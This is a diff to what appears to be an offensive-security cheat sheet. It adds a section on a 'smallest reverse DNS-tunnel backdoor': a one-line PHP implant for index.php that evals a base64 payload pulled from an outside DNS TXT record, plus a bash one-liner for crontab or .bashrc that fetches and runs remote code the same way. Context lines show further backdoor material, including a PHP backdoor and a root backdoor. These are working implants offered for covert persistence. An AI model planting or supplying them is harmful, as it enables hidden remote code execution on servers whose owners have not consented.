@@ -74,7 +74,8 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
-   1. [Smallest PHP backdoor](#php-backdoor) 
+   1. [Smallest PHP backdoor](#php-backdoor)
+   1. [Smallest reverse DNS-tunnel backdoor](#reverse-dns-backdoor)
    1. [Local Root backdoor](#ld-backdoor)
    1. [Self-extracting implant](#implant)
 1. [Host Recon](#hostrecon)
@@ -1828,8 +1829,32 @@ curl http://127.0.0.1:8080/x.php -d0='id'
 curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'
 ```
 
+<a id="reverse-dns-backdoor"></a>
+**6.v. Smallest reverse DNS-tunnel Backdoor**
+
+Method to get access to a Web-Server that is not accessible from the public Internet. The backdoor uses DNS-TUNNELING to execute an arbitrary command on the Web-Server.
+
+Add this implant to an index.php file (example):
+```php
+<?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
+```
+
+The payload is stored in a DNS TXT record under `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* create your own payload like so:
+```shell
+echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
+```
+...and use your own domain (_not_ b00m.team-teso.net).
+
+- The TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
+- It is a `bootloader` implant. Use a while loop to download larger implants via DNS.
+
+Works for `Bash` as well. Adding this to `crontab` or `~/.bashrc` yields similar results:
+```shell
+bash -c 'exec bash -c "{ $(sed s/\"//g <(dig +short b00m2.team-teso.net TXT)|base64 -d);}"'&>/dev/null
+```
+
 <a id="ld-backdoor"></a>
-**6.v. Local Root Backdoor**
+**6.vi. Local Root Backdoor**
 
 #### 1. Backdooring the dynamic loader with setcap
 
@@ -1857,7 +1882,7 @@ exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"ba
 ```
 
 <a id="implant"></a>
-**6.vi. Self-Extracting implant**
+**6.vii. Self-Extracting implant**
 
 Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
 
